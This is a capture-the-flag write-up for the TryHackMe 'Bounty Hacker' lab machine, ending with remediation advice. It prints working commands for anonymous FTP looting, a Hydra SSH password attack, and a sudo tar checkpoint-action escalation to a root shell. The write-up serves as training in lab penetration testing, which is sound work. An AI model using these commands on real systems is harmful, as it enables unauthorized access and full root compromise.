# TryHackMe — Bounty Hacker | Penetration Testing Write-Up

**Platform:** [TryHackMe — Bounty Hacker](https://tryhackme.com/room/cowboyhacker)  
**Track:** Ironhack Cybersecurity Bootcamp · Linux Boot2Root lab  
**Scope:** Authorized TryHackMe laboratory machine

## Overview

This project documents a complete privilege-escalation attack path in a controlled Linux lab: network reconnaissance, anonymous FTP enumeration, SSH password testing using an exposed wordlist, and privilege escalation through an overly permissive `sudo` rule.

## Findings

| Stage | Finding | Impact |
| --- | --- | --- |
| Reconnaissance | FTP (21), SSH (22), HTTP (80) | Exposed network services |
| FTP Enumeration | Anonymous login; `task.txt` and `locks.txt` accessible | Username and password candidates disclosed |
| Initial Access | Password for `lin` identified with Hydra | SSH login as `lin` |
| Privilege Escalation | `lin` can run `/bin/tar` as root | Root shell obtained |

### Verified services from this lab session

- **FTP:** vsftpd 3.0.5 (port 21)
- **SSH:** OpenSSH 8.2p1 (port 22)
- **HTTP:** Apache httpd 2.4.41 (port 80)

The target IP was `10.82.180.192` during this session; TryHackMe assigns different IP addresses to other lab sessions.

## Reproduction steps

The commands below were successfully used on the authorized lab target.

### 1. Reconnaissance

```bash
nmap -sC -sV <TARGET_IP>
```
Identifies exposed services, versions and default-script findings.

### 2. Anonymous FTP enumeration

```bash
ftp <TARGET_IP>
# Username: anonymous
# Press Enter for the password
ls
get task.txt
get locks.txt
bye
cat task.txt
cat locks.txt
```
Lists and downloads the exposed files. `task.txt` identifies `lin`; `locks.txt` contains candidate passwords.

### 3. SSH credential testing and user access

```bash
hydra -l lin -P locks.txt ssh://<TARGET_IP>
ssh lin@<TARGET_IP>
whoami
ls -la
cat ~/Desktop/user.txt
```
Tests the disclosed password list against SSH, obtains a shell and reads the user flag. Hydra found one valid password in this lab session.

### 4. Privilege escalation

```bash
sudo -l
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
whoami
```
`sudo -l` revealed `(root) /bin/tar`. GNU tar's checkpoint execution feature spawned a root shell; `whoami` confirmed `root`. The root shell was shown in the captured evidence. The `root.txt` output was not supplied in the recorded session.

## Remediation

1. Disable anonymous FTP access and restrict readable files.
2. Use strong, unique SSH credentials and prefer key-based authentication.
3. Remove unrestricted root execution of `/bin/tar` from `sudoers`; apply least privilege.


